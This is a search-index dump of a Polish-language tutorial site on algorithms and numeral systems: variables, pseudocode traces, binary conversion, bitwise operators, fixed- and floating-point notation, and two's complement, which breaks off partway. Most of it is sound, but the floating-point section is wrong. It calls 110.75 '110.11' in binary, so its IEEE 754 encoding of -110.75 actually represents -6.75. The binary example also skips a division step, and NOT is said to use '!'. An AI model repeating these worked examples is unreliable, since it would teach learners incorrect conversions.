granice.</p>"},{"location":"algorithms/introduction/linear-algorithms/#specyfikacja-problemu","title":"Specyfikacja problemu","text":"<p>Przede wszystkim zaczynamy od specyfikacji. Specyfikacja okre\u015bla, jakie dane wej\u015bciowe przyjmuje algorytm i co powinno by\u0107 jego wynikiem. Innymi s\u0142owy, jest to formalne zdefiniowanie problemu. Wr\u00f3\u0107my do naszego przyk\u0142adu.</p>"},{"location":"algorithms/introduction/linear-algorithms/#przykad-2","title":"Przyk\u0142ad 2","text":"<p>Zacznijmy od sformalizowania naszego problemu przygotowania kanapki z d\u017cemem za pomoc\u0105 specyfikacji.</p>"},{"location":"algorithms/introduction/linear-algorithms/#specyfikacja","title":"Specyfikacja","text":"<p>Dane:</p> <ul> <li>Kromka chleba</li> <li>Mas\u0142o</li> <li>D\u017cem</li> </ul> <p>Wynik:</p> <ul> <li>Kanapka z d\u017cemem</li> </ul> <p>Teraz mo\u017cemy przej\u015b\u0107 do algorytmu. Jak wida\u0107, mamy trzy dane wej\u015bciowe: kromk\u0119 chleba, mas\u0142o oraz d\u017cem. Nie musimy wi\u0119c martwi\u0107 si\u0119 o przygotowanie tych sk\u0142adnik\u00f3w. Zazwyczaj w zapisie algorytmu pomijamy etap wczytywania danych, co oznacza, \u017ce w tym przypadku opuszczamy instrukcje opisuj\u0105ce wzi\u0119cie chleba, mas\u0142a i d\u017cemu. Po prostu zak\u0142adamy, zgodnie ze specyfikacj\u0105, \u017ce te elementy s\u0105 nam ju\u017c dane i dost\u0119pne dla naszego algorytmu.</p>"},{"location":"algorithms/introduction/linear-algorithms/#algorytm","title":"Algorytm","text":"<pre><code>1. We\u017a n\u00f3\u017c\n2. Posmaruj chleb mas\u0142em\n3. Posmaruj chleb d\u017cemem\n</code></pre> <p>W tym przypadku ograniczyli\u015bmy si\u0119 do pewnego zbioru operacji i do pewnego poziomu szczeg\u00f3\u0142owo\u015bci. Gdy przejdziemy do bardziej technicznych algorytm\u00f3w, stanie si\u0119 jasne, kt\u00f3re operacje mo\u017cemy wykonywa\u0107, a kt\u00f3re nie.</p>"},{"location":"algorithms/introduction/variables/","title":"Zmienne","text":"<p>Czym jest zmienna? Mo\u017cna powiedzie\u0107, \u017ce to pewnego rodzaju pude\u0142ko na dane. Na zmiennych mo\u017cemy wykonywa\u0107 r\u00f3\u017cnego rodzaju operacje: mo\u017cemy \"wk\u0142ada\u0107\" (przypisywa\u0107) do nich r\u00f3\u017cne warto\u015bci, wykonywa\u0107 na nich operacje, wykorzystywa\u0107 w obliczeniach, a tak\u017ce odczytywa\u0107 ich warto\u015bci. </p> <p>Zmienne stanowi\u0105 niezb\u0119dny element praktycznie ka\u017cdego algorytmu. W zwi\u0105zku z tym ich poprawne i dog\u0142\u0119bne zrozumienie jest wymagane, by m\u00f3c konstruowa\u0107 i implementowa\u0107 zaawansowane algorytmy.</p>"},{"location":"algorithms/introduction/variables/#typy-zmiennych","title":"Typy zmiennych","text":"<p>Wyobra\u017amy sobie dwa pude\u0142ka: jedno plastikowe i jedno metalowe. Do plastikowego pude\u0142ka mo\u017cemy wk\u0142ada\u0107 tylko owoce, a do metalowego tylko gwo\u017adzie. Ka\u017cde z pude\u0142ek ma swoje przeznaczenie. Sw\u00f3j typ przechowywanych przedmiot\u00f3w.</p> <p>Podobnie jest ze zmiennymi. Ka\u017cda zmienna mo\u017ce przechowywa\u0107 tylko okre\u015blony typ warto\u015bci. M\u00f3wimy wtedy, \u017ce zmienna ma sw\u00f3j typ. Dla przyk\u0142adu, mo\u017cemy utworzy\u0107 zmienn\u0105 do przechowywania liczb ca\u0142kowitych. Do takiej zmiennej nie przypiszemy ju\u017c warto\u015bci innego typu, np. tekstu.</p> <p>Warning</p> <p>W niekt\u00f3rych j\u0119zykach programowania jednoznacznie okre\u015blamy typ zmiennej przy jej tworzeniu, w innych nie. Podobnie, s\u0105 j\u0119zyki, w kt\u00f3rych pr\u00f3ba przypisania innego typu warto\u015bci do zmiennej zako\u0144czy si\u0119 b\u0142\u0119dem. S\u0105 te\u017c takie, w kt\u00f3rych tego typu operacja b\u0119dzie dozwolona. Nie oznacza to jednak, \u017ce powinni\u015bmy to robi\u0107! Bardzo wa\u017cne jest przestrzeganie typu zmiennych. Jest to istotne z punktu widzenia czytelno\u015bci kodu programu, ale tak\u017ce z poziomu mechanik, kt\u00f3re kryj\u0105 si\u0119 pod spodem.</p>"},{"location":"algorithms/introduction/variables/#wartosci-zmiennych","title":"Warto\u015bci zmiennych","text":"<p>Wiemy ju\u017c, \u017ce do zmiennych mo\u017cemy przypisywa\u0107 warto\u015bci. Czy oznacza to jednak, \u017ce raz przypisana warto\u015b\u0107 do zmiennej pozostaje niezmienna? Jak mo\u017cna si\u0119 domy\u015bli\u0107 po nazwie zmienna, tak nie jest. Bardzo wa\u017cne jest by zrozumie\u0107, \u017ce warto\u015b\u0107 zmiennej okre\u015blamy w czasie, tzn. w danym punkcie dzia\u0142ania programu. By lepiej to zrozumie\u0107, sp\u00f3jrzmy na poni\u017csze przyk\u0142ady.</p>"},{"location":"algorithms/introduction/variables/#przykad-1","title":"Przyk\u0142ad 1","text":"<pre><code>1. a := 10\n2. Wypisz a\n3. a := 2 * a\n4. Wypisz a\n5. a := a + 5\n6. Wypisz a\n</code></pre> <p>Sp\u00f3jrz na powy\u017cszy pseudokod. Czy potrafisz powiedzie\u0107, jakie warto\u015bci zostan\u0105 wypisane w instrukcji 2, 4 i 6? Spr\u00f3buj odpowiedzie\u0107 na to pytanie, zanim przejdziesz dalej.</p> <p>Najlepszym sposobem jest przeprowadzenie symulacji danego pseudokodu. Bierzemy kartk\u0119 i d\u0142ugopis i wykonujemy kolejne operacje, zapisuj\u0105c warto\u015bci zmiennych w ka\u017cdym punkcie. Mo\u017cna to zrobi\u0107 na wiele sposob\u00f3w, jeden z nich prezentujemy poni\u017cej.</p> <pre><code>1. [a = 10]\n2. Wypisz 10\n3. [a = 2 * 10 = 20]\n4. Wypisz 20\n5. [a = 20 + 5 = 25]\n6. Wypisz 25\n</code></pre> <p>Jak wida\u0107, przedstawiony wcze\u015bniej algorytm wpisze kolejno liczby: \\(10,\\ 20,\\ 25\\).</p>"},{"location":"algorithms/introduction/variables/#przykad-2","title":"Przyk\u0142ad 2","text":"<pre><code>1. a := 0\n2. Dop\u00f3ki a &lt; 10, wykonuj:\n    3. a := a + 2\n    4. Wypisz a\n</code></pre> <p>Ponownie, zanim przejdziesz dalej spr\u00f3buj si\u0119 zastanowi\u0107 nad tym, jakie kolejne warto\u015bci wypisze powy\u017cszy algorytm.</p> <p>W tym przyk\u0142adzie bardzo wa\u017cne jest poprawne zrozumienie dzia\u0142ania p\u0119tli. P\u0119tla powtarza pewne operacje wielokrotnie, co oznacza, \u017ce te same instrukcje b\u0119dziemy wykonywa\u0107 kilka razy. Spr\u00f3bujmy to rozpisa\u0107.</p> <pre><code>1. [a = 0]\n\n2. Dop\u00f3ki 0 &lt; 10 - OK\n    3. [a = 0 + 2 = 2]\n    4. Wypisz 2\n\n2. Dop\u00f3ki 2 &lt; 10 - OK\n    3. [a = 2 + 2 = 4]\n    4. Wypisz 4\n\n 2. Dop\u00f3ki 4 &lt; 10 - OK\n     3. [a = 4 + 2 = 6]\n     4. Wypisz 6\n\n 2. Dop\u00f3ki 6 &lt; 10 - OK\n     3. [a = 6 + 2 = 8]\n     4. Wypisz 8\n\n 2. Dop\u00f3ki 8 &lt; 10 - OK\n     3. [a = 8 + 2 = 10]\n     4. Wypisz 10\n\n 2. Dop\u00f3ki 10 &lt; 10 - NIE (koniec p\u0119tli)\n</code></pre>"},{"location":"algorithms/introduction/variables/#prezentacja","title":"Prezentacja","text":"<p> Wprowadzenie</p> <p> \u0106wiczenia</p> <p> Zmienne w pami\u0119ci</p>"},{"location":"algorithms/matrix/","title":"Macierze","text":""},{"location":"algorithms/matrix/det3/","title":"Wyznacznik macierzy 3x3","text":""},{"location":"algorithms/matrix/det3/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/matrix/det3/#c","title":"C++","text":""},{"location":"algorithms/matrix/det3/#python","title":"Python","text":""},{"location":"algorithms/numeral-systems/","title":"Systemy liczbowe","text":"<p>Systemy liczbowe stanowi\u0105 swoisty j\u0119zyk, w kt\u00f3rym mo\u017cemy przedstawia\u0107 liczby oraz przeprowadza\u0107 na nich r\u00f3\u017cnorodne operacje, takie jak dodawanie, odejmowanie, mno\u017cenie czy dzielenie. S\u0105 one nieodzownym elementem matematyki, informatyki oraz wielu innych dziedzin nauki i techniki.</p>"},{"location":"algorithms/numeral-systems/#podstawowe-systemy-liczbowe","title":"Podstawowe Systemy Liczbowe","text":"<p>Kilka z istniej\u0105cych system\u00f3w liczbowych mo\u017cemy wsp\u00f3\u0142cze\u015bnie uzna\u0107 za podstawowe, czy te\u017c powszechnie stosowane, szczeg\u00f3lnie w informatyce, a konkretniej w algorytmice i programowaniu. Poni\u017cej opisujemy kilka z nich. Szerszy opis dost\u0119pny jest w za\u0142\u0105czonej prezentacji.</p> <p> Systemy liczbowe - prezentacja</p>"},{"location":"algorithms/numeral-systems/#system-dziesietny-decymalny","title":"System Dziesi\u0119tny (Decymalny)","text":"<p>Podstawa: \\(10\\)</p> <p>Zestaw Cyfr: \\(0, 1, 2, 3, 4, 5, 6, 7, 8, 9\\)</p> <p>Jest to system, z kt\u00f3rym stykamy si\u0119 na codzie\u0144 i kt\u00f3rego u\u017cywamy najcz\u0119\u015bciej.</p>"},{"location":"algorithms/numeral-systems/#system-binarny","title":"System Binarny","text":"<p>Podstawa: \\(2\\)</p> <p>Zestaw Cyfr: \\(0, 1\\)</p> <p>System binarny jest fundamentalny dla informatyki i technologii komputerowej.</p>"},{"location":"algorithms/numeral-systems/#system-oktalny","title":"System Oktalny","text":"<p>Podstawa: \\(8\\)</p> <p>Zestaw Cyfr: \\(0, 1, 2, 3, 4, 5, 6, 7\\)</p> <p>Stosowany mniej powszechnie, ale mo\u017ce s\u0142u\u017cy\u0107 jako skr\u00f3towy zapis liczb binarnych.</p>"},{"location":"algorithms/numeral-systems/#system-heksadecymalny","title":"System Heksadecymalny","text":"<p>Podstawa: \\(16\\)</p> <p>Zestaw Cyfr: \\(0-9\\) oraz \\(A-F\\) (gdzie \\(A=10, B=11, ..., F=15\\))</p> <p>Cz\u0119sto u\u017cywany w programowaniu do reprezentowania warto\u015bci binarnych w spos\u00f3b bardziej zwi\u0119z\u0142y, np. przy reprezentacji adres\u00f3w pami\u0119ci czy kolor\u00f3w.</p>"},{"location":"algorithms/numeral-systems/#konwersje-miedzy-systemami","title":"Konwersje Mi\u0119dzy Systemami","text":"<p>Zrozumienie metod konwersji mi\u0119dzy r\u00f3\u017cnymi systemami liczbowymi jest kluczowe, szczeg\u00f3lnie w dziedzinie informatyki. Operacje te obejmuj\u0105 dzielenie z reszt\u0105 (przy konwersji na ni\u017csze systemy) oraz mno\u017cenie i dodawanie (przy konwersji na wy\u017csze systemy).</p>"},{"location":"algorithms/numeral-systems/#zastosowania","title":"Zastosowania","text":"<p>Systemy liczbowe znajduj\u0105 swoje zastosowania w r\u00f3\u017cnych dziedzinach:</p> <ul> <li>Informatyka: System binarny jest podstaw\u0105 operacji komputerowych.</li> <li>Kryptografia: R\u00f3\u017cne systemy liczbowe s\u0105 u\u017cywane do tworzenia z\u0142o\u017conych algorytm\u00f3w szyfruj\u0105cych.</li> <li>Matematyka: Badanie r\u00f3\u017cnych system\u00f3w liczbowych jest istotnym elementem teorii liczb.</li> </ul>"},{"location":"algorithms/numeral-systems/#podsumowanie","title":"Podsumowanie","text":"<p>Zrozumienie r\u00f3\u017cnych system\u00f3w liczbowych i umiej\u0119tno\u015b\u0107 przeprowadzania konwersji mi\u0119dzy nimi s\u0105 fundamentalnymi kompetencjami w dziedzinie matematyki i informatyki. Umiej\u0119tno\u015b\u0107 ta otwiera drzwi do g\u0142\u0119bszego zrozumienia dzia\u0142ania komputer\u00f3w i innych system\u00f3w technologicznych, kt\u00f3re s\u0105 integraln\u0105 cz\u0119\u015bci\u0105 wsp\u00f3\u0142czesnego \u015bwiata.</p>"},{"location":"algorithms/numeral-systems/binary/","title":"System binarny","text":"<p>System binarny, zwany tak\u017ce systemem dw\u00f3jkowym, to podstawowy system liczbowy dla komputer\u00f3w. Liczby w tym systemie reprezentujemy korzystaj\u0105c z dw\u00f3ch cyfr: \\(0\\) i \\(1\\). Pozwala to na stosunkowo \u0142atw\u0105 techniczn\u0105 interpretacj\u0119 przesy\u0142anych danych, np. niskie i wysokie napi\u0119cie.</p>"},{"location":"algorithms/numeral-systems/binary/#konwersja-z-dziesietnego-na-binarny","title":"Konwersja z dziesi\u0119tnego na binarny","text":"<p>Konwersja z systemu dziesi\u0119tnego na binarny polega na dzieleniu ca\u0142kowitym liczby przez \\(2\\) i zapisywaniu reszt z dzielenia tak d\u0142ugo, a\u017c jako wynik dzielenia otrzymamy \\(0\\). Nast\u0119pnie otrzymane reszty z dzielenia odczytujemy od ko\u0144ca i w ten spos\u00f3b otrzymujemy zapis binarny liczby naturalnej. W celu lepszego zrozumienia opisanej procedury przeanalizujmy poni\u017cszy przyk\u0142ad.</p>"},{"location":"algorithms/numeral-systems/binary/#przykad","title":"Przyk\u0142ad","text":"<p>Chcemy przekonwertowa\u0107 liczb\u0119 \\(25\\) na system binarny. Na pocz\u0105tku dzielimy wi\u0119c ca\u0142kowicie \\(25\\) przez \\(2\\) otrzymuj\u0105c wynik \\(12\\) i reszty \\(1\\). Teraz dzielimy \\(12\\) ca\u0142kowicie przez \\(2\\) otrzymuj\u0105c wynik \\(6\\) i reszty \\(0\\). Nast\u0119pnie dzielimy \\(3\\) otrzymuj\u0105c wynik \\(1\\) i reszty \\(1\\). Na koniec pozosta\u0142o nam podzieli\u0107 \\(1\\) co daje nam wynik \\(0\\) i reszty \\(1\\). Teraz mo\u017cemy spisa\u0107 reszty od ko\u0144ca: \\(11001\\). W ten spos\u00f3b otrzymali\u015bmy zapis binarny liczby \\(25\\). </p> <p>Dla u\u0142atwienia tworzymy sobie tabelk\u0119, w kt\u00f3rej zapisujemy kolejne reszty i wyniki dzielenia.</p> div mod \\(25\\) \\(1\\) \\(12\\) \\(0\\) \\(6\\) \\(0\\) \\(3\\) \\(1\\) \\(1\\) \\(1\\) \\(0\\) \\[ 25_{10}=11001_2 \\]"},{"location":"algorithms/numeral-systems/binary/#algorytm","title":"Algorytm","text":"<p>Opiszemy teraz bardziej formalnie algorytm konwersji liczb naturalnych z systemu dziesi\u0119tnego na binarny. Zacznijmy od specyfikacji.</p>"},{"location":"algorithms/numeral-systems/binary/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/numeral-systems/binary/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna.</li> </ul>"},{"location":"algorithms/numeral-systems/binary/#wynik","title":"Wynik","text":"<ul> <li>Reprezentacja liczby \\(n\\) w systemie binarnym.</li> </ul>"},{"location":"algorithms/numeral-systems/binary/#pseudokod","title":"Pseudokod","text":"<pre><code>Funkcja DziesietnyNaBinarny(n):\n    1. binarna := \"\"\n    2. Dop\u00f3ki n &gt; 0, wykonuj:\n        3. reszta := n mod 2\n        4. Dopisz reszta na pocz\u0105tek binarna\n        5. n := n div 2\n    6. Zwr\u00f3c binarna\n</code></pre>"},{"location":"algorithms/numeral-systems/binary/#konwersja-z-binarnego-na-dziesietny","title":"Konwersja z binarnego na dziesi\u0119tny","text":"<p>W systemie binarnym, podobnie jak w innych systemach, do ka\u017cdej cyfry przypisana jest pot\u0119ga podstawy systemu: w tym wypadku pot\u0119ga liczby dwa. Ostatniej cyfrze (tzw. najmniej znacz\u0105cemu bitowi) przypisujemy pot\u0119g\u0119 zerow\u0105 (\\(2^0\\)). Przedostatniej: pierwsz\u0105 pot\u0119g\u0119 (\\(2^1\\)). Kolejnej: \\(2^2\\) itd. W celu obliczenia warto\u015bci liczby binarnej w systemie dziesi\u0119tnym, ka\u017cd\u0105 cyfr\u0119 przemna\u017camy przez przypisan\u0105 do niej pot\u0119g\u0119 dw\u00f3jki i wynik sumujemy, tak jak pokazano na poni\u017cszym przyk\u0142adzie.</p>"},{"location":"algorithms/numeral-systems/binary/#przykad_1","title":"Przyk\u0142ad","text":"\\[ 11001_2=1*2^4+1*2^3+0*2^2+0*2^1+1*2^0=2^4+2^3+2^0=16+8+1=25_{10} \\]"},{"location":"algorithms/numeral-systems/bitwise-operations/","title":"Operacje bitowe","text":"<p>Na bitach mo\u017cemy wykonywa\u0107 r\u00f3\u017cne operacje, podobnie jak na liczbach czy te\u017c cyfrach. Jest jednak pewna grupa operacji, tzw. operacje bitowe, kt\u00f3re s\u0105 specjalnymi operacjami wykonywanymi na bitach, czyli na warto\u015bciach \\(0\\) i \\(1\\). S\u0105 to w wi\u0119kszo\u015bci operacje logiczne, w kt\u00f3rych warto\u015b\u0107 \\(0\\) interpretujemy jako Fa\u0142sz, a warto\u015b\u0107 \\(1\\) interpretujemy jako Prawda.</p>"},{"location":"algorithms/numeral-systems/bitwise-operations/#and","title":"AND","text":"<p>Operacja wykonywana na dw\u00f3ch bitach. Zwraca \\(1\\) tylko wtedy, gdy obie warto\u015bci s\u0105 r\u00f3wne \\(1\\). W programowaniu ta operacja jest cz\u0119sto reprezentowana za pomoc\u0105 znaku &amp;.</p>"},{"location":"algorithms/numeral-systems/bitwise-operations/#tabelka","title":"Tabelka","text":"X Y X AND Y 0 0 0 0 1 0 1 0 0 1 1 1"},{"location":"algorithms/numeral-systems/bitwise-operations/#or","title":"OR","text":"<p>Operacja wykonywana na dw\u00f3ch bitach. Zwraca \\(1\\) wtedy, gdy co najmniej jedna z warto\u015bci jest r\u00f3wna \\(1\\). W programowaniu ta operacja jest cz\u0119sto reprezentowana za pomoc\u0105 znaku |.</p>"},{"location":"algorithms/numeral-systems/bitwise-operations/#tabelka_1","title":"Tabelka","text":"X Y X OR Y 0 0 0 0 1 1 1 0 1 1 1 1"},{"location":"algorithms/numeral-systems/bitwise-operations/#xor-exclusive-or","title":"XOR - Exclusive OR","text":"<p>Operacja wykonywana na dw\u00f3ch bitach. Zwraca \\(1\\) wtedy, gdy dok\u0142adnie jedna z warto\u015bci jest r\u00f3wna \\(1\\). W programowaniu ta operacja jest cz\u0119sto reprezentowana za pomoc\u0105 znaku ^.</p>"},{"location":"algorithms/numeral-systems/bitwise-operations/#tabelka_2","title":"Tabelka","text":"X Y X XOR Y 0 0 0 0 1 1 1 0 1 1 1 0"},{"location":"algorithms/numeral-systems/bitwise-operations/#not","title":"NOT","text":"<p>Operacja wykonywana na jednym bicie. Zwraca warto\u015b\u0107 przeciwn\u0105 bitu. W programowaniu ta operacja jest cz\u0119sto reprezentowana za pomoc\u0105 znaku !.</p>"},{"location":"algorithms/numeral-systems/bitwise-operations/#tabelka_3","title":"Tabelka","text":"X NOT X 0 1 1 0"},{"location":"algorithms/numeral-systems/conversion/","title":"Konwersja pomi\u0119dzy systemami","text":""},{"location":"algorithms/numeral-systems/conversion/#konwersja-z-binarnego-na-inne-systemy","title":"Konwersja z binarnego na inne systemy","text":""},{"location":"algorithms/numeral-systems/conversion/#na-osemkowy","title":"Na \u00f3semkowy","text":"<p>Konwertuj\u0105c z systemu binarnego na system \u00f3semkowy grupujemy bity po \\(3\\) (zaczynaj\u0105c od prawej strony) i te tr\u00f3jki bit\u00f3w konwertujemy na odpowiadaj\u0105ce im liczby w systemie \u00f3semkowym. W przypadku, gdy zabraknie nam bit\u00f3w, uzupe\u0142niamy je zerami z lewej strony.</p>"},{"location":"algorithms/numeral-systems/conversion/#przykad","title":"Przyk\u0142ad","text":""},{"location":"algorithms/numeral-systems/floating-point/","title":"Zapis zmiennoprzecinkowy","text":"<p>Reprezentacja liczb rzeczywistych w zapisie zmiennoprzecinkowym w systemie binarnym to technika, kt\u00f3ra umo\u017cliwia efektywne przechowywanie i manipulacj\u0119 liczbami rzeczywistymi w komputerze. W tej metodzie liczby reprezentowane s\u0105 za pomoc\u0105 trzech sk\u0142adnik\u00f3w: znaku, mantysy i cechy.</p>"},{"location":"algorithms/numeral-systems/floating-point/#struktura","title":"Struktura","text":"<p>Liczby zmiennoprzecinkowe zazwyczaj s\u0105 przedstawione zgodnie ze standardem IEEE 754, kt\u00f3ry okre\u015bla struktur\u0119 jak nast\u0119puje:</p> <ul> <li>Bit Znaku (ang. Sign Bit): okre\u015bla znak liczby; \\(0\\) oznacza dodatni, a \\(1\\) oznacza ujemny.</li> <li>Cecha (ang. Exponent): reprezentuje wyk\u0142adnik liczby w postaci znormalizowanej; reprezentowana za pomoc\u0105 \\(8\\) bit\u00f3w w pojedynczej precyzji, \\(11\\) bit\u00f3w w podw\u00f3jnej precyzji.</li> <li>Mantysa (ang. Fraction): zawiera cyfry znacz\u0105ce liczby; reprezentowana za pomoc\u0105 \\(23\\) bit\u00f3w w pojedynczej precyzji, \\(52\\) bit\u00f3w w podw\u00f3jnej precyzji.</li> </ul>"},{"location":"algorithms/numeral-systems/floating-point/#konwersja-z-systemu-dziesietnego","title":"Konwersja z systemu dziesi\u0119tnego","text":"<p>Jak przedstawi\u0107 liczb\u0119 rzeczywist\u0105 w systemie binarnym w zapisie zmiennoprzecinkowym opisuje poni\u017csza lista krok\u00f3w.</p> <ol> <li>Okre\u015blenie znaku: ustalamy znak liczby.</li> <li>Znalezienie reprezentacji binarnych: zamieniamy liczb\u0119 na r\u00f3wnowa\u017cn\u0105 liczb\u0119 binarn\u0105 (przed i po kropce dziesi\u0119tnej).</li> <li>Normalizacja: przesuwamy przecinek binarny tak, aby przed nim by\u0142a tylko jedna cyfra \\(1\\). Zapisujemy wyk\u0142adnik przedstawiaj\u0105cy liczb\u0119 miejsc, o kt\u00f3re przesuni\u0119to przecinek.</li> <li>Okre\u015blenie cechy i mantysy: wyodr\u0119bniamy warto\u015b\u0107 cechy i mantys\u0119 ze znormalizowanej formy.</li> </ol>"},{"location":"algorithms/numeral-systems/floating-point/#przykad-konwersji","title":"Przyk\u0142ad konwersji","text":"<p>Za\u0142\u00f3\u017cmy, \u017ce chcemy przedstawi\u0107 liczb\u0119 \\(-110.75\\) w formie zmiennoprzecinkowej (w standardzie IEEE 754 z pojedyncz\u0105 precyzj\u0105):</p> <ol> <li>Znak: liczba jest ujemna, wi\u0119c bit znaku b\u0119dzie \\(1\\).</li> <li>Reprezentacja binarna: \\(110.75\\) w binarnym to \\(110.11_2\\).</li> <li>Normalizacja: \\(110.11_2\\) mo\u017ce by\u0107 znormalizowane jako \\(1.1011_2 \\times 2^2\\).</li> <li>Cecha i mantysa:<ul> <li>Cecha: \\(2 + 127\\) (warto\u015b\u0107 bias) = \\(129\\), co daje nam \\(10000001_2\\).</li> <li>Mantysa: \\(.1011_2\\) (pomijaj\u0105c ukryt\u0105 jedynk\u0119).</li> </ul> </li> </ol> <p>St\u0105d, \\(-110.75\\) przedstawiamy jako:</p> <p>\\(1\\ 10000001\\ 10110000000000000000000\\)</p>"},{"location":"algorithms/numeral-systems/floating-point/#zastosowania-i-wazne-kwestie","title":"Zastosowania i wa\u017cne kwestie","text":"<ul> <li>Precyzja: reprezentacja zmiennoprzecinkowa mo\u017ce prowadzi\u0107 do b\u0142\u0119d\u00f3w zaokr\u0105glenia, poniewa\u017c nie wszystkie liczby dziesi\u0119tne mog\u0105 by\u0107 dok\u0142adnie przedstawione w binarnym zapisie zmiennoprzecinkowym.</li> <li>Zakres: reprezentacja ta pozwala na przedstawienie bardzo ma\u0142ych i bardzo du\u017cych liczb, co jest szczeg\u00f3lnie przydatne w obliczeniach naukowych i in\u017cynieryjnych.</li> <li>Szybko\u015b\u0107: operacje na liczbach zmiennoprzecinkowych mog\u0105 by\u0107 wolniejsze w por\u00f3wnaniu z operacjami na liczbach ca\u0142kowitych, szczeg\u00f3lnie w przypadku procesor\u00f3w z ograniczon\u0105 obs\u0142ug\u0105 operacji zmiennoprzecinkowych.</li> </ul>"},{"location":"algorithms/numeral-systems/floating-point/#podsumowanie","title":"Podsumowanie","text":"<p>Zapis zmiennoprzecinkowy w systemie binarnym jest niezb\u0119dnym narz\u0119dziem w informatyce, umo\u017cliwiaj\u0105cym reprezentacj\u0119 i manipulacj\u0119 liczbami rzeczywistymi w skomputeryzowanych systemach. Cho\u0107 mo\u017ce prowadzi\u0107 do b\u0142\u0119d\u00f3w zaokr\u0105glenia, jego elastyczno\u015b\u0107 i zakres sprawiaj\u0105, \u017ce jest to dominuj\u0105cy spos\u00f3b reprezentacji liczb rzeczywistych w komputerach.</p>"},{"location":"algorithms/numeral-systems/integer-notation/","title":"Zapis sta\u0142oprzecinkowy","text":"<p>Reprezentacja liczb rzeczywistych w systemie binarnym w zapisie sta\u0142oprzecinkowym jest istotnym konceptem w informatyce, szczeg\u00f3lnie w kontek\u015bcie zastosowa\u0144 in\u017cynieryjnych i naukowych. Ten spos\u00f3b reprezentacji jest prosty, ale ma ograniczenia w kontek\u015bcie zakresu i precyzji. Zrozumienie tego konceptu jest kluczowe do pracy z systemami binarnymi i digitalizacj\u0105 sygna\u0142\u00f3w.</p> <p>Zacznijmy od podstawowych zagadnie\u0144:</p> <ul> <li>Reprezentacja liczby: liczby rzeczywiste w systemie binarnym w zapisie sta\u0142oprzecinkowym s\u0105 reprezentowane jako ci\u0105gi bit\u00f3w, kt\u00f3re s\u0105 podzielone na dwie cz\u0119\u015bci: cz\u0119\u015b\u0107 ca\u0142kowit\u0105 i cz\u0119\u015b\u0107 u\u0142amkow\u0105, rozdzielone sta\u0142ym miejscem, zwanym przecinkiem.</li> <li>Cz\u0119\u015b\u0107 ca\u0142kowita: cz\u0119\u015b\u0107 liczby znajduj\u0105ca si\u0119 po lewej stronie przecinka. Konwertowana jest na binarny w spos\u00f3b podobny do konwersji liczb ca\u0142kowitych.</li> <li>Cz\u0119\u015b\u0107 u\u0142amkowa: cz\u0119\u015b\u0107 liczby znajduj\u0105ca si\u0119 po prawej stronie przecinka. Konwertowana jest na binarny przez mno\u017cenie przez \\(2\\) i zapisywanie cz\u0119\u015bci ca\u0142kowitej wyniku na ka\u017cdym etapie, a\u017c do uzyskania wyniku zero lub osi\u0105gni\u0119cia wymaganej precyzji.</li> </ul>"},{"location":"algorithms/numeral-systems/integer-notation/#przykad","title":"Przyk\u0142ad","text":""},{"location":"algorithms/numeral-systems/integer-notation/#krok-1","title":"Krok 1","text":"<p>Oddziel cz\u0119\u015b\u0107 ca\u0142kowit\u0105 i u\u0142amkow\u0105 liczby rzeczywistej.</p> <p>Liczba dziesi\u0119tna: \\(10.625\\)</p>"},{"location":"algorithms/numeral-systems/integer-notation/#krok-2","title":"Krok 2","text":"<p>Konwertuj cz\u0119\u015b\u0107 ca\u0142kowit\u0105 na binarny.</p> <p>\\(10_{10}=1010_2\\)</p>"},{"location":"algorithms/numeral-systems/integer-notation/#krok-3","title":"Krok 3","text":"<p>Konwertuj cz\u0119\u015b\u0107 u\u0142amkow\u0105 na binarny.</p> <p>Cz\u0119\u015b\u0107 u\u0142amkowa (\\(0.625\\)):</p> <ol> <li>\\(0.625 * 2 = 1.25\\) (zapisz \\(1\\))</li> <li>\\(0.25 * 2 = 0.5\\) (zapisz \\(0\\))</li> <li>\\(0.5 * 2 = 1.0\\) (zapisz \\(1\\))</li> </ol> <p>Wi\u0119c \\(0.625_{10}=0.101_2\\)</p>"},{"location":"algorithms/numeral-systems/integer-notation/#krok-4","title":"Krok 4","text":"<p>Po\u0142\u0105cz cz\u0119\u015b\u0107 ca\u0142kowit\u0105 i u\u0142amkow\u0105 w jednym zapisie: \\(10.625_{10}=1010.101_2\\)</p>"},{"location":"algorithms/numeral-systems/integer-notation/#zalety-i-wady","title":"Zalety i Wady","text":""},{"location":"algorithms/numeral-systems/integer-notation/#zalety","title":"Zalety","text":"<ul> <li>Prostota reprezentacji.</li> <li>\u0141atwe dodawanie i odejmowanie.</li> </ul>"},{"location":"algorithms/numeral-systems/integer-notation/#wady","title":"Wady","text":"<ul> <li>Ograniczona precyzja.</li> <li>Problem z reprezentacj\u0105 niekt\u00f3rych liczb u\u0142amkowych (np. \\(0.1\\) nie ma dok\u0142adnej reprezentacji binarnej).</li> <li>Mo\u017ce wymaga\u0107 du\u017cej liczby bit\u00f3w do reprezentacji liczb z du\u017c\u0105 precyzj\u0105.</li> </ul>"},{"location":"algorithms/numeral-systems/integer-notation/#zastosowania","title":"Zastosowania","text":"<p>Zapisy sta\u0142oprzecinkowe s\u0105 cz\u0119sto u\u017cywane w aplikacjach, gdzie zakres liczb jest ograniczony i znany z g\u00f3ry. Jest on r\u00f3wnie\u017c u\u017cywany w systemach wbudowanych z powodu swojej prostoty i mniejszych wymaga\u0144 zasob\u00f3w w por\u00f3wnaniu z zapisem zmiennoprzecinkowym.</p>"},{"location":"algorithms/numeral-systems/integer-notation/#podsumowanie","title":"Podsumowanie","text":"<p>Reprezentacja liczb rzeczywistych w systemie binarnym w zapisie sta\u0142oprzecinkowym jest istotna dla wielu dziedzin in\u017cynierii i informatyki. Oferuje ona prosty spos\u00f3b reprezentowania liczb rzeczywistych, ale z pewnymi ograniczeniami zwi\u0105zanymi z precyzj\u0105 i zakresem.</p>"},{"location":"algorithms/numeral-systems/u2/","title":"System U2","text":"<p>System U2, czyli system uzupe\u0142nie\u0144 do dw\u00f3ch, pozwala na reprezentacj\u0119 nie tylko dodatnich warto\u015bci, ale tak\u017ce ujemnych. W tym systemie szczeg\u00f3lne znaczenie ma pierwszy, najbardziej znacz\u0105cy bit liczby, kt\u00f3ry jest bezpo\u015brednio powi\u0105zany z jej znakiem.</p> <p>Zacznijmy od cech charakterystycznych dla tego zapisu.</p> <ol> <li>Bit znaku: najbardziej znacz\u0105cy bit (MSB) s\u0142u\u017cy jako bit znaku: \\(0\\) oznacza 